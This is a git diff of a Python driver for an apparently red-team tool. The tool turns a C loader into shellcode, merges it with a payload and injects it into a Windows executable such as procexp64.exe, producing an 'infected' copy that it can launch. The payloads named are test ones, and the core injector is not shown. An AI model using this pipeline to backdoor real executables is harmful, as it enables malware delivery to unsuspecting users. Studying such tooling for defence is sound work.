@@ -12,137 +12,12 @@ from phases.ctoasm import *
 from phases.asmtoshc import *
 from phases.shctoexe import *
 from observer import observer
-
-
-options_default = {
-    "payload": "shellcodes/calc64.bin",
-    "verify": False,
-
-    # Temp
-    "source_style": SourceStyle.peb_walk,
-
-    # configuration
-    "alloc_style": AllocStyle.RWX,
-    "exec_style": ExecStyle.CALL,
-    "copy_style": CopyStyle.SIMPLE,
-    "dataref_style": DataRefStyle.APPEND,
-
-    # injecting into exe
-    "inject_exe": True,
-    "inject_mode": "1,1",
-    "inject_exe_in": "exes/procexp64.exe",
-    "inject_exe_out": "out/procexp64-a.exe",
-
-    "try_start_loader_shellcode": False,  # without payload (Debugging)
-    "try_start_final_shellcode": False,    # with payload (should work)
-    "try_start_final_infected_exe": True, # with payload (should work)
-
-    # cleanup
-    "cleanup_files_on_start": False,
-    "cleanup_files_on_exit": False,
-
-    # For debugging: Can disable some steps
-    "generate_asm_from_c": True,  
-    "generate_shc_from_asm": True, 
-
-    # Not working atm
-    "obfuscate_shc_loader": False,
-    "test_obfuscated_shc": False,
-}
-
-
-# VERIFY: STD
-# This will verify if our loader works
-# - payload shellcode will create a file c:\temp\a
-options_verify_std = {
-    "payload": "shellcodes/createfile.bin",
-    "verify": True,
-
-    # Temp
-    "source_style": SourceStyle.peb_walk,
-
-    # configuration
-    "alloc_style": AllocStyle.RWX,
-    "exec_style": ExecStyle.CALL,
-    "copy_style": CopyStyle.SIMPLE,
-    "dataref_style": DataRefStyle.APPEND,
-
-    # testing
-    "try_start_loader_shellcode": False,
-    "try_start_final_shellcode": False,
-    "try_start_final_infected_exe": False,
-
-    # injecting into exe
-    "inject_exe": True,
-    "inject_mode": "1,1",
-    "inject_exe_in": "exes/procexp64.exe",
-    "inject_exe_out": "out/procexp64-a.exe",
-
-    # For debugging: Can disable some steps
-    "generate_asm_from_c": True,        # phase 2
-    "generate_shc_from_asm": True,      # phase 3
-    
-    # cleanup
-    "cleanup_files_on_start": True,
-    "cleanup_files_on_exit": True, # all is just in out/
-
-    # doesnt work
-    "obfuscate_shc_loader": False,
-    "test_obfuscated_shc": False,
-}
-
-
-# VERIFY: IAT
-# This will verify if our loader works
-# - payload shellcode will create a file c:\temp\a
-options_verify_iat = {
-    "payload": "shellcodes/createfile.bin",
-    "verify": True,
-
-    # Temp
-    "source_style": SourceStyle.peb_walk,
-    
-    # configuration
-    "alloc_style": AllocStyle.RWX,
-    "exec_style": ExecStyle.CALL,
-    "copy_style": CopyStyle.SIMPLE,
-    "dataref_style": DataRefStyle.APPEND,
-
-    # testing
-    "try_start_loader_shellcode": False,
-    "try_start_final_shellcode": False,
-    "try_start_final_infected_exe": False,
-
-    # injecting into exe
-    "inject_exe": True,
-    "inject_mode": "1,1",
-    "inject_exe_in": "exes/iattest-full.exe",  # important
-    "inject_exe_out": "out/iatttest-full-a.exe",
-
-    # For debugging: Can disable some steps
-    "generate_asm_from_c": True,
-    "generate_shc_from_asm": True,
-    
-    # cleanup
-    "cleanup_files_on_start": True,
-    "cleanup_files_on_exit": True, # all is just in out/
-
-    # doesnt work
-    "obfuscate_shc_loader": False,
-    "test_obfuscated_shc": False,
-}
-
-options = None
+from project import project
 
 main_c_file = os.path.join(build_dir, "main.c")
 main_asm_file = os.path.join(build_dir, "main.asm")
 main_exe_file = os.path.join(build_dir, "main.exe")
 main_shc_file = os.path.join(build_dir, "main.bin")
-
-debug_data = {
-    "original_exe": b"",
-    "infected_exe": b"",
-}
 
 
 def main():
@@ -156,80 +31,90 @@ def main():
     args = parser.parse_args()
 
     if args.verify:
+        project.payload = "shellcodes/createfile.bin"
+        project.verify = True
+
+        project.try_start_final_infected_exe = False
+        project.try_start_final_shellcode = False
+        project.try_start_final_infected_exe = False
+
         if args.verify == "std":
-            options = options_verify_std
+            project.source_style = SourceStyle.peb_walk
+            project.inject = True
+            project.inject_mode = "1,1"
+            project.inject_exe_in = "exes/procexp64.exe"
+            project.inject_exe_out = "out/procexp64-a.exe"
         elif args.verify == "iat":
-            options = options_verify_iat
+            project.source_style = SourceStyle.iat_reuse
+            project.inject = True
+            project.inject_mode = "1,1"
+            project.inject_exe_in = "exes/iattest-full.exe"
+            project.inject_exe_out = "out/iatttest-full-a.exe"
         else:
             print("Unknown verify option {}, use std/iat".format(args.verify))
     else:
-        options = options_default
         if args.shellcode:
             if not os.path.isfile(args.shellcode):
                 print("Could not find: {}".format(args.shellcode))
                 return
-            options["payload"] = args.shellcode
+            project.payload = args.shellcode
         if args.inject:
             if not os.path.isfile(args.inject):
                 print("Could not find: {}".format(args.inject))
                 return
-            options["inject_exe"] = True
-            options["inject_exe_in"] = args.inject
-            options["inject_exe_out"] = args.inject.replace(".exe", ".infected.exe")
-    start(options)
+            project.inject = True
+            project.inject_exe_in = args.inject
+            project.inject_exe_out = args.inject.replace(".exe", ".infected.exe")
+    start()
 
 
-def start(options):
+def start():
     # Delete: all old files
-    if options["cleanup_files_on_start"]:
+    if project.cleanup_files_on_start:
         clean_files()
+        delete_all_files_in_directory("logs/")
 
     # Check: Destination EXE capabilities
-    capabilities = ExeCapabilities([
+    project.exe_capabilities = ExeCapabilities([
         "GetEnvironmentVariableW",
         "VirtualAlloc"
     ])
-    capabilities.parse_from_exe(options["inject_exe_in"])
-    capabilities.print()
+    project.exe_capabilities.parse_from_exe(project.inject_exe_in)
+    project.exe_capabilities.print()
 
-    if capabilities.has_all():
-        options["source_style"] = SourceStyle.iat_reuse
+    # choose which source / technique we gonna use
+    if project.exe_capabilities.has_all():
+        project.source_style = SourceStyle.iat_reuse
     else:
-        options["source_style"] = SourceStyle.peb_walk
+        project.source_style = SourceStyle.peb_walk
 
-    observer.add_json("capabilities_a", capabilities)
-    observer.add_json("options", options)
+    #observer.add_json("capabilities_a", project.exe_capabilities)
+    #observer.add_json("options", options)
 
-    print("--[ SourceStyle: {}".format(options["source_style"].name))
+    print("--[ SourceStyle: {}".format(project.source_style.name))
 
     # Copy: loader C files into working directory: build/
-    if options["source_style"] == SourceStyle.peb_walk:
-        observer.add_text("main_c", file_readall_text("source/peb_walk/main.c"))
-        shutil.copy("source/peb_walk/main.c", "build/main.c")
-        shutil.copy("source/peb_walk/peb_lookup.h", "build/peb_lookup.h")
-    elif options["source_style"] == SourceStyle.iat_reuse:
-        observer.add_text("main_c", file_readall_text("source/iat_reuse/main.c"))
-        shutil.copy("source/iat_reuse/main.c", "build/main.c")
+    create_c_from_template()
 
     # Convert: C -> ASM
-    if options["generate_asm_from_c"]:
+    if project.generate_asm_from_c:
         # Find payload size
-        with open(options["payload"], 'rb') as input2:
+        with open(project.payload, 'rb') as input2:
             data_payload = input2.read()
             payload_length = len(data_payload)
             #observer.add_text("payload_asm_orig", str(data_payload))
-        asm = make_c_to_asm(main_c_file, main_asm_file, payload_length, capabilities)
+        asm = make_c_to_asm(main_c_file, main_asm_file, payload_length, project.exe_capabilities)
         observer.add_text("payload_asm_orig", asm["initial"])
         observer.add_text("payload_asm_cleanup", asm["cleanup"])
         observer.add_text("payload_asm_fixup", asm["fixup"])
 
     # Convert: ASM -> Shellcode
-    if options["generate_shc_from_asm"]:
+    if project.generate_shc_from_asm:
         code = make_shc_from_asm(main_asm_file, main_exe_file, main_shc_file)
         observer.add_code("generate_shc_from_asm", code) 
     
     # Try: Starting the shellcode (rarely useful)
-    if options["try_start_loader_shellcode"]:
+    if project.try_start_loader_shellcode:
         try_start_shellcode(main_shc_file)
 
     # SGN 
@@ -241,11 +126,12 @@ def start(options):
     #            return
 
     # Merge shellcode/loader with payload
-    if options["dataref_style"] == DataRefStyle.APPEND:
-        print("--[ Merge stager: {} + {} -> {} ] ".format(main_shc_file, options["payload"], main_shc_file))
+    if project.dataref_style == DataRefStyle.APPEND:
+        print("--[ Merge stager: {} + {} -> {} ] ".format(
+            main_shc_file, project.payload, main_shc_file))
         with open(main_shc_file, 'rb') as input1:
             data_stager = input1.read()
-        with open(options["payload"], 'rb') as input2:
+        with open(project.payload, 'rb') as input2:
             data_payload = input2.read()
         print("---[ Size: Stager: {} and Payload: {}  Sum: {} ]".format(
             len(data_stager), len(data_payload), len(data_stager)+len(data_payload)))
@@ -255,13 +141,13 @@ def start(options):
             output.write(data)
             observer.add_code("final_shellcode", data)
 
-        if options["verify"] and options["source_style"] == SourceStyle.peb_walk:
+        if project.verify and project.source_style == SourceStyle.peb_walk:
             print("--[ Verify final shellcode ]")
             if not verify_shellcode(main_shc_file):
                 print("Could not verify, still continuing")
                 #return
 
-        if options["try_start_final_shellcode"]:
+        if project.try_start_final_shellcode:
             print("--[ Test Append shellcode ]")
             try_start_shellcode(main_shc_file)
 
@@ -269,24 +155,20 @@ def start(options):
         shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))
 
     # inject merged loader into an exe
-    if options["inject_exe"]:
-        debug_data["original_exe"] = file_readall_binary(options["inject_exe_in"])
+    if project.inject:
+        #debug_data["original_exe"] = file_readall_binary(options["inject_exe_in"])
 
-        inject_exe(
-            main_shc_file, 
-            options["inject_exe_in"], 
-            options["inject_exe_out"], 
-            options["inject_mode"],
-            capabilities)
-        if options["verify"]:
+        inject_exe(main_shc_file)
+        if project.verify:
             print("--[ Verify final exe ]")
-            if verify_injected_exe(options["inject_exe_out"]):
-                debug_data["infected_exe"] = file_readall_binary(options["inject_exe_out"])
+            if verify_injected_exe(project.inject_exe_out):
+                #debug_data["infected_exe"] = file_readall_binary(options["inject_exe_out"])
+                pass
 
-        if options["try_start_final_infected_exe"]:
+        if project.try_start_final_infected_exe:
             print("--[ Start infected exe ]")
             subprocess.run([
-                options["inject_exe_out"],
+                project.inject_exe_out,
             ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     # dump the info i gathered
@@ -295,7 +177,7 @@ def start(options):
     file.close()
 
     # delete files
-    if options["cleanup_files_on_exit"]:
+    if project.cleanup_files_on_exit:
         clean_files()
 
 
